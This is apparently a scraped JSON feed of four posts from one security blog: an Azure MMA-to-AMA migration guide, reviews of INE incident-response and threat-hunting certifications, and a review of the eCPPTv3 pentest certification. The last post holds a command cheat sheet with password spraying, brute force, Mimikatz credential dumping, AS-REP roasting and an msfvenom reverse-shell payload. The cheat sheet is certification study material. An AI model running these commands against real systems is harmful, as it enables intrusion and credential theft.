[{"content":"Migration from MMA to AMA and DCR configuration + Azure Policy Microsoft has announced the deprecation of the Microsoft Monitoring Agent (MMA), effective August 31. If you\u0026rsquo;re still using MMA to collect and manage your monitoring data, now is the time to plan your transition to Azure Monitor Agent (AMA).\n‚ö†Ô∏è Warning The MMA will officially be deprecated on August 31. Although MMA will continue to be active for logging purposes until 1 of February, it‚Äôs important to note that Microsoft will not provide support for any issues encountered after August 31.\nTherefore, to ensure uninterrupted support and to take advantage of the latest features, you should complete your migration to AMA before the deprecation date.\nThe Azure Monitor Agent represents a significant advancement in monitoring capabilities, offering enhanced performance, security, and flexibility. Microsoft recommends migrating to AMA to take advantage of these improvements and ensure continued support for your monitoring needs.\nIn this post, we‚Äôll guide you through the migration process by showing you how to configure and install the new Azure Monitor Agent, set up Data Collection Rules (DCR), and apply Azure policies to automate the deployment of both the AMA agent and DCR. This step-by-step guide will ensure a seamless transition and help you leverage the latest monitoring technology efficiently.\nContent\nAMA Migration Workbook Agent Installation - Creation of DCR Azure Policy Conclusion 1. AMA Migration Workbook To get a comprehensive view of all the VMs, Azure Arc resources, and VMSS that need to be migrated to the new Azure Monitor Agent (AMA), you can use this workbook.\nNavigate over Monitor Service on Azure ‚Üí Workbooks ‚Üí AMA Migration Helper\nHere you can find the migration status, with all the machines to be migrated categorized by different resource types. The workbook highlights:\nIn blue: Agents with both agents. In red: Agents with only MMA/OMS. In green: Agents with only AMA. Within each tab, you can also see detailed status updates for agent installations on each VM, Azure ARC or VMSS highlighting the specific installation status.\nüí° This workbook can be very useful as it provides detailed insights into the agent installations allowing you to view each installation in detail. 2. Agent Installation - Creation of DCR (Windows) ‚ö†Ô∏è Warning You need to create the DCR from Sentinel Connector Naviga su Sentinel ‚Üí Data Connector ‚Üí Windows Security Events via AMA\nOpen connector page\nHere tou can create your DCR\nüí° What I recommend is creating separate Data Collection Rules for each type of host, such as Windows and Linux (use Syslog via AMA), and also dividing the DCRs for other groups of machines. This approach ensures that you have DCRs with specific events tailored to different types of hosts Define Name for the DCR and Resource Group where is stored (default will be Sentinel)\nIn the Resources tab select all the VM and Azure Arc that you want to monitoring.\nAfter all you need to select with kind of event you want to store.\nüí° To better understand what to ingest, here you can find guides that describe in detail what each tab represents.\nWindows ‚Üí Windows Security Event Reference Linux ‚Üí Configure Syslog in Azure portal Deep Dive on Linux event ‚Üí How to debug Syslog ingestion After all click on Create and wait the creation of DCR and the deploy of AMA over VM and Azure ARC.\nEvidence of DCR created over DCR services Evidence of AMA installation on VM üö® Alert Remember to unistall the MMA agent, as having it active could result in duplicate events within your workspace. 3. Azure Policy Azure Policy can be used to deploy the Azure Monitor Agent. To achieve this, follow these steps:\nNavigate to the Azure Policy Section: Access the Azure portal and go to the \u0026ldquo;Policy\u0026rdquo; section from the left-hand menu. Create a New Policy: In the Azure Policy dashboard, select \u0026ldquo;Create Policy\u0026rdquo; to start the process of defining a new policy. Configure the Policy: Set up the policy parameters to deploy the Azure Monitor Agent. You can specify the conditions under which the agent should be installed and apply it to the appropriate scope, such as specific resource groups or subscriptions. Assign the Policy: Once configured, assign the policy to the desired resources. This will ensure that the Azure Monitor Agent is automatically installed on all resources that meet the policy criteria. üí° Here you can find guides that describe in detail the Azure Policy. There are built-in policy initiatives for Windows and Linux virtual machines Azure Policy Within these two rules, I recommend selecting exclusively the following two policies that are essential for installing the Azure Monitor Agent (AMA) and assigning the Data Collection Rule (DCR) to the VM:\nPolicy for Installing the Azure Monitor Agent (AMA): This policy ensures that the AMA is automatically deployed on the targeted virtual machines. It simplifies the installation process by applying the agent configuration across your environment.\nPolicy for Assigning Data Collection Rules (DCRs): This policy is responsible for applying the appropriate DCR to each VM. It guarantees that the data collection settings are consistently applied, enabling accurate and comprehensive monitoring.\nPolicy for Installing the Azure Monitor Agent (AMA) Starting for the first one click on Configure Windows virtual machines to run Azure Monitor Agent with user-assigned managed identity-based authentication and click on Assign\nHere you need to select the Scope where the Policy will be executed.\nFor example you can also select all Subscption or even specific Resource Group.\nüí° You can also build an Exclusions path to ensure that you do not unintentionally apply the policy you are creating. Skip the Advances step\nOn Parameters step set Bring Your Own User-Assigned Managed Identity as True\nIn the Remediation tab, enter a user-assigned managed identity and check the box for \u0026ldquo;Create Remediation Task.\u0026rdquo; This will ensure that the policy uses the specified identity and sets up a remediation task if needed.\nüí° Create user-assigned managed identity in order to have a identity that have the correct permission to install AMA and also assign the DCR.\nRequired permissions: Create and Edit DCR\nNavigate over Managed Identities and click on Create\nAfter creating it, remember to add the required permissions in the Azure Role Assignments section.\nRole example (here I add owner just for a test)\n‚ö†Ô∏è Warning Remember that adding the Remediation tab allows the policy to be applied to existing VMs as well. Without this tab, the policy would only apply to new VMs created after the policy is implemented Here you can add a message if the policy will be non-compliante\nThen in review + create tab click on Create\nüö® Alert Policy are not really fast so you need to wait 10-15 minute untill it will be applied. Inside the Compliance tab you can monitoring the policy status and the non-compliance resources or non-compliant policies.\nClick on it you can see the real evidence of the policy status and the affected machine.\nüö® Alert If the policy returns an error and is marked as non-compliant, use the Remediation Task tab to reapply the policy.\nWithin the Remediation tab, you can monitor the progress of the remediation.\nPolicy for Assigning Data Collection Rules (DCRs) Starting for the first one click on Configure Windows Machines to be associated with a Data Collection Rule or a Data Collection Endpoint and click on assign\nAs previously done, configure the required sections.\nSkip the Advanced tab\nIn the Parameters tab insert the ID of the DCR created in the Step 2\nüí° How to find DCR ID?\nClick on DCR Service and find click on JSON View\nClick on Copy\nAs previously use the User Assigned managed Identity created before with all the role permission\nAdd comment if you want and click on create policy\nüö® Alert Policy are not really fast so you need to wait 10-15 minute untill it will be applied. Inside the Compliance tab you can monitoring the policy status and the non-compliance resources or non-compliant policies.\nConclusion In conclusion, migrating from the Microsoft Monitoring Agent (MMA) to the Azure Monitor Agent (AMA) represents a significant upgrade to your monitoring infrastructure. By creating Data Collection Rules (DCRs) and leveraging Azure Policy for automated deployment, you can streamline the process and ensure consistent and comprehensive monitoring across your environment.\nThe migration involves several key steps: setting up the new AMA, defining and configuring DCRs to suit your specific monitoring needs, and applying Azure Policies to automate the deployment and assignment of both the AMA and DCRs. This approach not only simplifies the transition but also enhances the efficiency and effectiveness of your monitoring setup.\nBy following these guidelines, you will benefit from improved performance, increased flexibility, and better support for your monitoring requirements. Ensure that you complete the migration before the deprecation of MMA to avoid any disruptions and to fully leverage the advanced features and capabilities of AMA\nüí° If you have any questions or need further assistance, feel free to contact me via LinkedIn. I‚Äôm here to help with any queries you may have about the migration process.\nFeel free to adjust the contact details or add any additional information as needed.\n","date":"2025-03-06T00:00:00Z","permalink":"https://robertodandrea.com/post/microsoft/migration-from-mma-to-ama-and-dcr-configuration--azure-policy/","title":"Migration from MMA to AMA and DCR configuration + Azure Policy"},{"content":"The Certified Incident Responder (eCIR) by INE is a certification designed for professionals specializing in incident response and forensic investigations.\nThis certification is tailored for cybersecurity practitioners who aim to deepen their skills in identifying, containing, and remediating security incidents effectively. Priced at 400$, the certification includes a practical exam lasting two days, followed by an additional two days to submit the final report detailing your findings.\nThis review includes personal notes and an example of the methodologies applied during the exam.\nüí° Personal Notes on the Course Content In this section, I‚Äôve included some of my notes to help guide others studying for the eCIR certification. These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.\neCIR Certification Notes ‚Üí eCIR Notes Certification Breakdown Incident Preparedness and Management: Learn to design and implement incident response plans. Key topics include identifying Indicators of Attack (IoA) and Indicators of Compromise (IoC) and leveraging automated playbooks for response. Focus is placed on integrating frameworks like NIST and MITRE ATT\u0026amp;CK into workflows. Threat Intelligence Integration: Leverage tools such as Splunk and ELK (Elastic) for correlation, log aggregation, and monitoring threat intelligence feeds. Hands-on practice includes creating custom dashboards to visualize incidents and measure their impact. Exam Structure The eCIR certification exam is divided into two hands-on parts, simulating real-world incident response scenarios:\nPart 1: Splunk Focuses on using Splunk to analyze compromises that occurred on specific endpoints within a network. Candidates must identify anomalies and understand how the compromise propagated through the environment. Part 2: ELK Centers on leveraging the ELK stack for log correlation and advanced analysis. A PCAP file is provided in this part, containing captured traffic from the attack, which must be analyzed to extract critical details about the intrusion. Candidates are required to document their findings in a comprehensive report, demonstrating their ability to follow a structured methodology. This report must be submitted within two days of completing the practical portion.\nüí° Personal Tips for Success This certification, in my experience, presents a medium-to-low difficulty level, especially if you are already familiar with tools like Splunk, ELK and Wireshark. My approach was to methodically investigate each host present in the network by analyzing possible Windows Security Log Events. From there, I built my understanding and followed up with targeted investigations, leveraging my prior knowledge of these tools. The hands-on nature of the exam and the need for a structured methodology made the process both challenging and rewarding. Master Core Tools: Familiarize yourself deeply with Splunk, ELK. Focus on advanced features like custom queries, regex, and anomaly detection patterns. Analyze PCAP Files: Practice using tools like Wireshark to analyze network traffic, especially for identifying malicious communications. Time Management: Allocate time for each part of the exam and reserve a buffer for writing the report. Leverage MITRE ATT\u0026amp;CK: Use this framework to map attack techniques and provide structured context in your report. Take Detailed Notes: During the labs, document every step. These notes will help streamline your report writing and ensure you don‚Äôt miss critical details. Letter of Engagement (PDF) Wireshark (PCAP)\nConclusion INE\u0026rsquo;s eCIR certification is an excellent opportunity for cybersecurity professionals to enhance their incident response and forensic skills. By mastering tools like Splunk, ELK and Wireshark, candidates gain practical expertise in handling real-world security incidents.\nWith its focus on hands-on learning, structured methodologies, and real-world data analysis (including PCAP files), the certification provides invaluable insights into modern incident response practices.\n","date":"2025-08-30T00:00:00Z","permalink":"https://robertodandrea.com/post/ine/certified-incident-responder-ecir-review-ine/","title":"Certified Incident Responder eCIR Review - INE"},{"content":"The Certified Threat Hunting Professional v2 (eCTHPv2) by INE is a certification designed for security professionals focused on threat hunting.\nThis certification is ideal for security analysts and threat hunters who wish to learn in-depth techniques for identifying malicious activities across network and endpoint environments. Priced at $399, the certification includes a practical exam and requires a final report, to be completed within two days post-exam. This guide includes notes and an example of the exam I completed.\nThis certification is broken down into three main areas:\nCourse Structure and Certification Details Introduction to Threat Hunting: This section introduces core threat hunting concepts, life cycles of threats, and detection methodologies. Key topics include identifying Indicators of Compromise (IoC) and building threat-hunting hypotheses. A crucial part is understanding threat behaviors and utilizing frameworks like MITRE ATT\u0026amp;CK to create a structured approach. Hunting the Network \u0026amp; Network Analysis: This part focuses on network traffic analysis and techniques for spotting suspicious patterns. Practical insights are given into monitoring network data using Splunk and understanding packet analysis. The module covers spotting lateral movement and data exfiltration signs. Hunting the Endpoint \u0026amp; Endpoint Analysis: Here, emphasis is on endpoint analysis, covering tools like Volatility for memory analysis and ELK (Elastic) for log analysis, focusing on detecting malware indicators and suspicious activity on endpoints. üí° Personal Notes on the Course Content n this section, I‚Äôve included some of my notes to help guide others studying for the eCTHPv2 certification. These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.\neCTHPv2 Certification Notes ‚Üí eCTHP Notes Exam Details The eCTHPv2 exam consists of three hands-on labs:\nSplunk: For log monitoring and network traffic analysis. Volatility: For forensics and memory analysis. ELK (Elastic): For system log management and analysis. After completing these labs, you have two days to complete the exam and an additional two days to submit the final report, which must detail your findings and conclusions from the hunting activities.\nTips for Success Since you‚Äôre already familiar with Splunk and ELK, here are some focused tips:\nReview the MITRE ATT\u0026amp;CK Framework: Get well-acquainted with common attack techniques. This framework will support you in your report, especially when describing threat-hunting processes. Maximize Tool Knowledge: Even if you know Splunk and ELK well, delve deeper into filtering techniques, regex for complex queries, and setting up customized dashboards and alerts. Thorough Documentation: During the labs, take meticulous notes. The final report should detail not just results but also your methodologies to demonstrate a structured approach. Time Management: Plan each lab‚Äôs activities and reserve time for report review to meet the certification‚Äôs strict deadlines. Practice with Real Scenarios: Aside from course materials, practice with realistic case studies to solidify your knowledge, especially in network and endpoint analysis. Conclusion INE\u0026rsquo;s eCTHPv2 provides significant hands-on experience in threat hunting, emphasizing proactive response to network and endpoint threats. By mastering tools like Splunk, Volatility, and ELK, this certification enhances your ability to detect and analyze anomalies in an enterprise setting. The hands-on labs and structured threat-hunting techniques make it a comprehensive choice for anyone serious about advancing their skills in cybersecurity and threat detection.\n","date":"2025-08-06T00:00:00Z","permalink":"https://robertodandrea.com/post/ine/certified-threat-hunting-professional-v2-ecthpv2-review-ine/","title":"Certified Threat Hunting Professional v2 (eCTHPv2) Review - INE"},{"content":"Certified Professional Penetration Tester (eCPPTv3) - INE The Certified Professional Penetration Tester (eCPPTv3) by INE is a practical certification designed for professionals specializing in penetration testing and ethical hacking. This certification is ideal for those looking to deepen their skills in identifying and mitigating security vulnerabilities.\nThe certification is priced at 400$ and includes a practical exam lasting 24 hours, during which you are required to complete penetration testing activities and answer 45 questions based on your findings.\nThis review includes personal notes and an example of the methodologies applied during the exam.\nüí° Personal Notes on the Course Content In this section, I‚Äôve included some of my notes to help guide others studying for the eCPPTv3 certification. These notes summarize key takeaways from each module, covering essential techniques, tools, and strategies for threat hunting within networks and endpoints.\neCPPT Notes ‚Üí eCPPT Notes Exam Structure: The exam is divided into two main components:\nLab Environment: You will be provided with a virtual environment containing various systems, including Linux and Windows hosts, such as Windows servers acting as Domain Controllers. Your objective is to identify and exploit vulnerabilities within this environment to gain unauthorized access. Lab Questions: After compromising the environment, you will answer 45 questions related to your activities and findings during the penetration test. The exam is to be completed within 24 hours, and you are required to submit your answers to the questions within this timeframe. Unlike previous versions, there is no requirement to submit a detailed report of your activities and findings.\nExam Objectives: Information Gathering \u0026amp; Reconnaissance (10%): Perform host discovery and port scanning on target networks. Enumerate information from services running on open ports. Initial Access (15%): Perform username enumeration to identify valid user accounts on target systems. Perform password spraying attacks to identify valid credentials for initial access. Perform brute-force attacks on remote access services for initial access. Web Application Penetration Testing (15%): Perform web application enumeration to identify potential vulnerabilities and misconfigurations. Identify and exploit common web application vulnerabilities for initial access (e.g., SQL injection, cross-site scripting, command injection). Perform brute-force attacks against login forms. Exploit vulnerable and outdated web application components. Exfiltrate data and credentials from compromised web applications and databases. Exploitation \u0026amp; Post-Exploitation (25%): Identify and exploit vulnerabilities or misconfigurations in services. Identify and exploit privilege escalation vulnerabilities. Dump and crack password hashes. Identify insecurely stored credentials. Exploit Development (5%): Develop or modify exploit code for initial access and post-exploitation. Identify and exploit memory corruption vulnerabilities (e.g., stack overflow, buffer overflow). Active Directory Penetration Testing (30%): Perform information gathering on Active Directory. Perform enumeration attacks on Active Directory. Exploit Active Directory vulnerabilities. Perform privilege escalation attacks in Active Directory. Perform lateral movement attacks in Active Directory. Perform persistence attacks in Active Directory. Perform data exfiltration attacks in Active Directory. Personal Tips for Success üí° This certification, in my experience, presents a medium-to-high difficulty level, especially if you are not familiar with Active Directory (AD). The exam focuses significantly on AD exploitation techniques, making it essential to have a solid understanding of AD environments.\nTo enhance your preparation, engaging with platforms like **GOAD (Game of Active Directory)** can be highly beneficial. GOAD provides a vulnerable AD environment, ideal for practicing common attack techniques. Detailed documentation and guides on tackling GOAD challenges are available on Mayfly277\u0026rsquo;s website.\nAdditionally, platforms such as Hack The Box offer practical labs that can be extremely useful. Specifically, the machines SAUNA, ACTIVE, and TIMELAPSE are designed to practice AD exploitation techniques. These labs allow you to refine your skills in a controlled and challenging environment.\nAnother valuable resource is the mind map provided by Orange Cyberdefense, which offers a clear overview of AD penetration testing techniques. This mind map will help you visualize the various phases and tools necessary to approach the exam successfully.\nhttps://orange-cyberdefense.github.io/ocd-mindmaps/\nTable of useful command Tool Description cmd kerbrute Enumerate / brute force / password spray Enumeration:\nkerbrute userenum -d example.local \u0026ndash;dc 192.168.1.10 users.txt\nBruteForce:\nkerbrute bruteuser -d example.local \u0026ndash;dc 192.168.1.10 administrator passwords.txt\nUser list file:\nusers.txt crackmapexec Enum hosts\nEnum null session\nEnum anonymous access Get password Policy:\ncme -u ‚Äòuser‚Äô -p ‚Äòpassword‚Äô \u0026ndash;pass-pol\nUsername but NO pwd:\ncme smb \u0026lt;dc_ip\u0026gt; -u user.txt -p password.txt \u0026ndash;no-bruteforce\nValid Credential:\ncme smb -u -p \u0026lsquo;\u0026lt;password_from_before\u0026gt;\u0026rsquo; \u0026ndash;users\ncme smb -u -p \u0026lsquo;\u0026lt;password_from_before\u0026gt;\u0026rsquo; \u0026ndash;shares\nEnumeration:\ncrackmapexec smb crackmapexec smb -u \u0026lsquo;a\u0026rsquo; -p \u0026lsquo;\u0026rsquo;\nLateral Movement:\ncrackmapexec smb -u -p -d evil-winrm Access to target machine Lateral Movement:\nevil-winrm -i 192.168.1.100 -u Administrator -p \u0026lsquo;Password123\u0026rsquo; xfreerdp Access to target machine Lateral Movement:\nxfreerdp /v:192.168.1.100 /u:Administrator /p:\u0026lsquo;Password123\u0026rsquo; smbclient Access to SMB/CIFS resource Lateral Movement:\nsmbclient.py /:@\nsmbclient -L //\u0026lt;dc_ip/ Enter-PSSession Start interactive session Enter-PSSession Enter-PSSession seclogs.resesarch.security.local net Useful for policy settings net accounts\nnet user administrator runas Access to victim runas.exe /user:administrator cmd PowerView Enumeration AD - Powersploit suite AS-REP Roasting primary step:\n_Get-DomainUser winpeas Identify misconfigurations, permissions, and vulnerabilities Privilege escalation:\nwinpeas.exe msfvenom Used to generate a reverse_tcp payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe \u0026gt; rTCP.exe msfconsole Metasploit module msfconsole -q\nMeterpreter session:\nexploit/windows/misc/hta_server Mimikatz https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/ hashdump:\nhashdump\nReturn NTLM Hash of the user\ncreds_all:\ncreds:all\nExtract all possible hashes or credentials\nlsa_dump_secrets:\nlsa_dump_secrets\nExtract credential stored into Local Security Authority\nlsa_dump_sam:\nlsa_dump_sam\nExtract Security Account Manager and dumps credentials for local accounts psexec Execute command on target machine psexec \\\\\u0026lt;target_ip\u0026gt; \u0026lt;cmd_command\u0026gt;\nOR\nUse for PTH wmiexec Used to run command on target machine python wmiexec.py username:password@target_ip \u0026ldquo;whoami\u0026rdquo; fping Ping ICMP machines to get alive fping -a -g 192.168.1.0/24 GetNPUsers Used to find hash python GetNPUsers.py / -userfile \u0026lt;username.txt\u0026gt; -format hashcat -outputfile \u0026lt;hash_out.txt\u0026gt;\nrebeus.exe asreproast /format:hashcat hashcat Used to crack hash hashcat -m -a \u0026lt;type_of_attack\u0026gt; hash.txt hydra Brute force hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2 wpscan Wordpress vuln nmap Port scanning nmap -sC -sV -Pn -p- -oA output.txt \u0026lt;IP_addr\u0026gt; -vv Conclusion The eCPPTv3 certification offers cybersecurity professionals a valuable opportunity to deepen their expertise in penetration testing, particularly focusing on Active Directory environments. By engaging with hands-on labs and utilizing resources like GOAD and Hack The Box, candidates can develop practical skills essential for real-world security assessments. The exam\u0026rsquo;s emphasis on Active Directory exploitation reflects current security needs, highlighting the importance of mastering techniques to identify and mitigate risks associated with identity and access management within organizations.\nIncorporating these resources into your preparation can enhance your understanding and proficiency in penetration testing, thereby increasing your chances of success in the eCPPTv3 exam.\n","date":"2025-01-28T00:00:00Z","permalink":"https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/","title":"Certified Professional Penetration Tester (eCPPTv3) - INE"}]